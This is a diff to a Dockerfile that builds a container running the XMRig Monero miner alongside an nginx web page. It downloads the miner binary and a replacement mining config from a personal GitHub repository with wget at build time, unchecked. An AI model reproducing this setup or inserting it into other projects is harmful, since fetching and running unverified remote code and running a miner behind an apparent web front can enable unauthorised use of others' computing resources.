@@ -9,21 +9,23 @@ RUN apt-get update && apt-get install -y \
     libuv1-dev \
     libssl-dev \
     libhwloc-dev \
-    nginx
+    nginx \
+    wget && \
+    rm -rf /var/lib/apt/lists/*
 
 # Clone XMRig repository
-RUN git clone https://github.com/xmrig/xmrig.git
+# Download the file
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
 
-# Build XMRig
-RUN mkdir xmrig/build && cd xmrig/build && \
-    cmake .. && \
-    make -j$(nproc)
+# Extract the tar.gz file
+RUN tar xvzf xmrig-6.21.0-linux-x64.tar.gz
 
-# Set up config file (replace with your own config)
-COPY config.json /xmrig/build/config.json
+# Change directory
+WORKDIR /xmrig-6.21.0/
 
-# Expose mining port
-EXPOSE 3333
+# Remove existing config.json and download a new one
+RUN rm -f config.json && \
+    wget https://raw.githubusercontent.com/maanya125/super-duper-spoon/main/config.json
 
 # Copy the custom Nginx configuration to serve the web page
 COPY nginx.conf /etc/nginx/sites-available/default
@@ -31,11 +33,12 @@ COPY nginx.conf /etc/nginx/sites-available/default
 # Copy the index.html file to Nginx document root
 COPY index.html /var/www/html/index.html
 
-# Expose port for the web page
+# Expose ports for mining and web page
+EXPOSE 3333
 EXPOSE 8080
 
-# Set working directory
-WORKDIR /xmrig/build
+# Set working directory for XMRig
+WORKDIR /xmrig-6.21.0/
 
 # Command to run XMRig and Nginx
 CMD service nginx start && ./xmrig --config=config.json
